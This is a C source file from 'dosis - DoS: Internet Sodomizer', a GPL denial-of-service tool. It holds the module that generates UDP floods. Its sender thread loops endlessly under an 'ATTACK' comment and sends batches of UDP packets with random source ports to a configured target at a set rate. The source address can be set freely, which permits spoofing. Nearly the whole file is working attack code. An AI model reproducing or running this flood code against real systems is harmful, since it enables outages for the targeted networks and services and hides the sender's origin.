/*****************************************************************************
 * udp.c
 *
 * UDP packet generator.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo Garc�a Pe�a <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>
#include "dosconfig.h"
#include "dosis.h"
#include "ip.h"
#include "lnet.h"
#include "log.h"
#include "payload.h"
#include "tea.h"

typedef struct _tag_UDP_CFG {
  /* options */
  INET_ADDR          shost;
  INET_ADDR          dhost;

  /* parameters */
  unsigned           npackets;
  double             hitratio;
  char              *payload;
  unsigned           payload_size;

  /* other things */
  pthreadex_timer_t  timer;
  LN_CONTEXT        *lnc;
} UDP_CFG;

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

#define ip_protocol(x) (((struct iphdr *) (x))->protocol)
#define ip_header(x)   ((struct iphdr *)  (x))
#define udp_header(x)  ((struct udphdr *) ((x) \
                       + (((struct iphdr *) (x))->ihl << 2)))

static int udp__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
{
  UDP_CFG *tu = (UDP_CFG *) tw->data;

  /* check msg size and headers */
  if(size < sizeof(struct iphdr)
  || ip_protocol(msg) != 17
  || size < sizeof(struct udphdr) + (ip_header(msg)->ihl << 2))
    return 0;

  /* check msg */
DBG("[%s]   VEREDICT: %d (%x, %d) [%x, %d]",
    tw->methods->name,
    ip_header(msg)->saddr == tu->dhost.addr.in.addr
    && ntohs(udp_header(msg)->source) == tu->dhost.port,
    ip_header(msg)->saddr, ntohs(udp_header(msg)->source),
    tu->dhost.addr.in.addr, tu->dhost.port);
  return ip_header(msg)->saddr == tu->dhost.addr.in.addr
      && ntohs(udp_header(msg)->source) == tu->dhost.port
         ? -255 : 0;
}

static void udp__thread(THREAD_WORK *tw)
{
  UDP_CFG *tu = (UDP_CFG *) tw->data;
  int i;

  DBG("[%02u] Started sender thread", tw->id);

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tu->hitratio > 0)
      if(pthreadex_timer_wait(&(tu->timer)) < 0)
        ERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /* build UDP packet with payload (if requested) */
    DBG("[%02u] Sending %d packet(s)...", tw->id, tu->npackets);
    for(i = 0; i < tu->npackets; i++)
      ln_send_udp_packet(tu->lnc,
                         &tu->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
                         &tu->dhost.addr.in.inaddr, tu->dhost.port,
                         tu->payload, tu->payload_size);
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int udp__configure(THREAD_WORK *tw, SNODE *command)
{
  UDP_CFG *tu = (UDP_CFG *) tw->data;
  SNODE *cn;
  char *s;

  /* first initialization (specialized work thread data) */
  if(tu == NULL)
  {
    if((tu = calloc(1, sizeof(UDP_CFG))) == NULL)
      D_FAT("[%02d] No memory for UDP_CFG.", tw->id);
    tw->data = (void *) tu;

    /* initialize libnet */
    DBG("[%02u] Initializing libnet.", tw->id);
    if((tu->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
      D_FAT("[%02d] No memory for LN_CONTEXT.", tw->id);
    ln_init_context(tu->lnc);

    pthreadex_timer_init(&(tu->timer), 0.0);
  }

  /* read from SNODE command parameters */
  cn = command->command.thc.to->to.pattern;
  if(cn->type != TYPE_PERIODIC)
    FAT("%d: Uknown pattern %d.", cn->line, cn->type);
  
  tu->hitratio = tea_get_float(cn->pattern.periodic.ratio);
  tu->npackets = tea_get_int(cn->pattern.periodic.n);
  if(tu->hitratio < 0)
    FAT("%d: Bad hit ratio '%f'.", cn->line, tu->hitratio);
  if(tu->npackets <= 0)
    FAT("%d: Bad number of packets '%d'.", cn->line, tu->npackets);

  /* read from SNODE command options */
  for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
    switch(cn->type)
    {
      case TYPE_OPT_SRC:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tu->shost))
          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tu->shost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_DST:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tu->dhost))
          FAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tu->dhost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_PAYLOAD_FILE:
      case TYPE_OPT_PAYLOAD_RANDOM:
      case TYPE_OPT_PAYLOAD_STR:
        payload_get(cn, &tu->payload, &tu->payload_size);
        break;

      default:
        FAT("%d: Uknown option %d.", cn->line, cn->type);
    }

  /* configure timer */
  if(tu->hitratio > 0)
    pthreadex_timer_set_frequency(&(tu->timer), tu->hitratio);

  /* configure src address (if not defined) */
  if(tu->dhost.type == INET_FAMILY_NONE)
    FAT("I need a target address.");
  if(tu->shost.type == INET_FAMILY_NONE)
  {
    DOS_ADDR_INFO *ai;
    if((ai = dos_get_interface(&tu->dhost)) == NULL)
    {
      char buff[255];
      ip_addr_snprintf(&tu->shost, sizeof(buff), buff);
      WRN("Cannot find a suitable source address for '%s'.", buff);
    } else
      ip_addr_copy(&tu->shost, &ai->addr);
  }

  /* (debug) print configuration */
  {
    char buff[255];

    DBG2("[%d] config.periodic.n     = %d", tw->id, tu->npackets);
    DBG2("[%d] config.periodic.ratio = %d", tw->id, tu->hitratio);

    ip_addr_snprintf(&tu->shost, sizeof(buff)-1, buff);
    DBG2("[%d] config.options.shost  = %s", tw->id, buff);
    ip_addr_snprintf(&tu->dhost, sizeof(buff)-1, buff);
    DBG2("[%d] config.options.dhost  = %s", tw->id, buff);
  }

  return 0;
}

static void udp__cleanup(THREAD_WORK *tw)
{
  UDP_CFG *tc = (UDP_CFG *) tw->data;

  /* collect libnet data */
  ln_destroy_context(tc->lnc);
  free(tc->lnc);
  pthreadex_timer_destroy(&tc->timer);

  if(tc->payload)
  {
    free(tc->payload);
    tc->payload = NULL;
  }
  free(tc);
  tw->data = NULL;

  DBG("[%d] Finalized.", tw->id);
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * UDP TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaUDP = {
  .name         = "UDP",
  .configure    = udp__configure,
  .cleanup      = udp__cleanup,
  .listen_check = udp__listen_check,
  .thread       = udp__thread,
};

